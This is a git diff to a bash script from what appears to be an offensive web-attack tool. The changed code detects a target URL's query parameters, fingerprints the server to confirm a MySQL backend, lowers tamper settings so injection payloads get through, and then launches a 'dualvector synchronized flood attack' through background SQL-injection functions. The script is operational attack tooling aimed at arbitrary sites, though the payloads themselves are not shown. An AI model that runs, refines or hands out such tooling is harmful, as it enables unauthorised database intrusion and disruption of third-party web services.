@@ -674,70 +674,81 @@ case "$http_status" in
         ;;
 esac                    
           if [ -f "$DEFIANCE_DIR/../validators/ayam.py" ]; then
-            echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
-            eye_report=$(python "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
+    echo -e "[\033[34m${ayamaa}\033[0m] [i] Analyzing parameter.."
+    
+    eye_report=$(python3 "$DEFIANCE_DIR/../validators/ayam.py" "$target_url")
+    param_type=$(echo "$eye_report" | cut -d'|' -f1)
+    discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
 
-            param_type=$(echo "$eye_report" | cut -d'|' -f1)
-            discovered_keys=$(echo "$eye_report" | cut -d'|' -f3)
-
-            if [ "$param_type" = "QUERY_PARAM" ]; then
-              echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Query Parameters Spotted > ($discovered_keys)\033[0m"
-              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
-              export REQ_METHOD="GET"
-              export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
-
-            elif [ "$param_type" = "PATH_PARAM" ] || [ "$param_type" = "NO_PARAM" ] || [[ "$target_url" != *"?"* ]]; then
-              echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
-              echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
-              echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
-              exit 1
-
-            else
-              echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Falling back to default.\033[0m"
-              export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
-              export REQ_METHOD="GET"
-            fi
-          fi
-          cookie_flag=""
-          if [ -n "$custom_cookie" ]; then
-            cookie_flag="-b $custom_cookie"
-            echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie"
-          fi
-          echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
-
-          server_fingerprint=$(curl $recon_proxy -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
-
-          if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
-            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
-
-            echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
-
-            echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
+    case "$param_type" in
+        "QUERY_PARAM")
+            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m] \033[1mActive Query Parameters Spotted > ($discovered_keys)\033[0m"
+            export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
+            export REQ_METHOD="GET"
+            export TARGET_PARAM=$(echo "$discovered_keys" | cut -d',' -f1)
+            ;;
+        "PATH_PARAM"|"NO_PARAM")
+            echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
+            echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
             exit 1
-
-          else
-
-            echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
-          fi
-          if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
-
-            echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
-
-          fi
-          sleep 1
-          if [ "$enable_val" = "true" ]; then
-            if [ -s "$ROOT_LOG_FILE" ]; then
-              echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
-              read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
-              if [ "$tanya" = "y" ]; then
-                > "$ROOT_LOG_FILE"
-                echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
-              else
-                echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
-              fi
+            ;;
+        *)
+            if [[ "$target_url" != *"?"* ]]; then
+                echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Error: GET parameters not found [POST Method / Form Detected]."
+                echo -e "[\033[34m${ayamaa}\033[0m] [i] Action Required: Please inspect the target's HTML form elements to identify valid parameters first."
+                echo -e "\e[0;37m[-] Operation aborted to prevent invalid asset execution.\n"
+                exit 1
+            else
+                echo -e "[\033[34m${ayamaa}\033[0m] [i]\033[1m No parameters detected. Falling back to default.\033[0m"
+                export WORDLIST_MYSQL="$DEFIANCE_DIR/../data/HAHA.txt"
+                export REQ_METHOD="GET"
             fi
-          fi
-          echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"
+            ;;
+    esac
+fi
+
+cookie_flag=""
+if [ -n "$custom_cookie" ]; then
+    cookie_flag="-b $custom_cookie"
+    echo "[\033[34m${ayamaa}\033[0m] [i] Custom Cookie inputted: $custom_cookie"
+fi
+
+echo -e "[\033[34m${ayamaa}\033[0m] [i] Performing database environment verification.."
+server_fingerprint=$(curl "$recon_proxy" -m 5 -s -I "$target_url" | grep -Ei "(Server|X-Powered-By|Set-Cookie|X-DDoS|WAF)")
+
+if echo "$server_fingerprint" | grep -qEi "(oracle|postgre|mssql|microsoft-iis|supabase)"; then
+    echo -e "\n[\033[34m${ayamaa}\033[0m] [\e[0;31m!\e[0m] Target rejected, Non MySQL environment fingerprint."
+    echo -e "[i] Footprint: $(echo "$server_fingerprint" | tr '\r\n' ' ')"
+    echo -e "[\033[34m${ayamaa}\033[0m][->] Revert. Operation aborted to prevent structural asset wastage."
+    exit 1
+else
+    echo -e "[\033[34m${ayamaa}\033[0m] [\033[1;34m+\033[0m]\e[0m \033[1mTarget environment matches MySQL compliance directives.\033[0m"
+fi
+
+if echo "$server_fingerprint" | grep -qEi "(php|PHPSESSID|apache|litespeed)" || [[ "$target_url" == *"testphp"* ]]; then
+    echo -e "[\033[34m${ayamaa}\033[0m] [i] This web envi is outdated/just a test, to ensure the payloads to be executed, \033[1mthe tamper has been downgraded \033[0m[Space2comment, randomcase only]."
+fi
+
+sleep 1
+
+if [ "$enable_val" = "true" ] && [ -s "$ROOT_LOG_FILE" ]; then
+    echo -e "[\033[34m${ayamaa}\033[0m] [?] Your log file is not empty."
+    read -p "[\033[34m${ayamaa}\033[0m] Do you want to overwrite it? (y/n): " tanya
+    tanya=$(echo "$tanya" | tr '[:upper:]' '[:lower:]')
+    
+    case "$tanya" in
+        y|yes)
+            > "$ROOT_LOG_FILE"
+            echo -e "[\033[34m${ayamaa}\033[0m] [\033[34m+\e[0m] \033[1mLog overwritten.\033[0m\n"
+            ;;
+        *)
+            echo -e "[\033[34m${ayamaa}\033[0m] [i] Previous log entries will also be scanned."
+            ;;
+    esac
+fi
+
+echo -e "[\033[34m${ayamaa}\033[0m] [i] Launching dualvector synchronized flood attack against \e[1;34m$target_url\e[0m...\n"                 
 
           vector_sqli_agressor_left &
           pid_vector1=$!
